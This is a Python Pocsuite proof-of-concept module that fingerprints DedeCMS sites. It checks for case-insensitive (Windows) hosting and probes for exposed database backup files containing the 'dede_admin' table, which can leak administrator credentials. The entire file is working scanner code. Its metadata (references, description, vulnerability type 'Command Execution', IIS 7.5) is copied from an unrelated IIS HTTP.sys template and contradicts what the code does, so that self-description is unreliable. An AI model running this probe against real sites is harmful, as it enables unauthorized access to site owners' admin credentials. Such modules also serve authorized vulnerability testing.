#!/usr/bin/env python
# coding: utf-8

import urllib
import random
import string
from collections import OrderedDict

from pocsuite.api.request import req  #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class DedeShortNamePOC(POCBase):
    PocName = 'short_name_dede_cms'
    vulID = '3387'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = 'ceshiceshi'  #  PoC作者的大名
    vulDate = '2018/11/21'  #漏洞公开的时间,不知道就写今天
    createDate = '2018/11/21'  # 编写 PoC 的日期
    updateDate = '2018/11/21'  # PoC 更新的时间,默认和编写时间一样
    references = [
        'https://technet.microsoft.com/library/security/ms15-034']  # 漏洞地址来源,0day不用写
    name = 'short_name_dede_cms 漏洞 PoC'  # PoC 名称
    appPowerLink = 'https://www.microsoft.com/'  # 漏洞厂商主页地址
    appName = 'iis'  # 漏洞应用名称
    appVersion = '7.5'  # 漏洞影响版本
    vulType = 'Command Execution'  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def GetBackUp(self,url):
        for num in range(1, 5):
            try:
                newurl = url.strip() + "/data/backupdata/dede_a~" + str(num) + '.txt'
                # print newurl
                r = req.get(newurl, timeout=8)
                if r.status_code == 200 and "dede_" in r.text:
                    if len(r.text) > 1000:
                        pass
                    else:
                        if "dede_admin" in r.text:
                            self.url=newurl
                            return 1
                else:
                    return 0
            except:
                continue
        return 0
    def TestingCms(self,url):
        dedehash = [
            "/data/admin/ver.txt",
            "/data/admin/allowurl.txt",
            "/data/index.html",
            "/data/js/index.html",
            "/data/mytag/index.html",
            "/data/sessions/index.html",
            "/data/textdata/index.html",
            "/dede/action/css_body.css",
            "/dede/css_body.css",
            "/dede/templets/article_coonepage_rule.htm",
            "/include/alert.htm",
            "/member/images/base.css",
            "/member/js/box.js",
            "/php/modpage/readme.txt",
            "/plus/sitemap.html",
            "/setup/license.html",
            "/special/index.html",
            "/templets/default/style/dedecms.css",
            "/company/template/default/search_list.htm"]
        for hashone in dedehash:
            try:
                dedehashone = url + hashone
                r = req.get(dedehashone, timeout=8)
                if r.status_code == 200:
                    # print 'check cms is ok'
                    dedehashone = url + '/' + hashone[1].upper() + hashone[2:]
                    r = req.get(dedehashone, timeout=8)
                    if r.status_code == 200:
                        # print 'check os is ok'
                        if self.GetBackUp(self.url) == 1:
                            # print 'check short is ok'
                            return 1
                        else:
                            break
                    else:
                        break
            except:
                return 0
        return 0
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        # self.url = self.url
        checkcode = self.TestingCms(self.url)
        if checkcode == 1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(DedeShortNamePOC)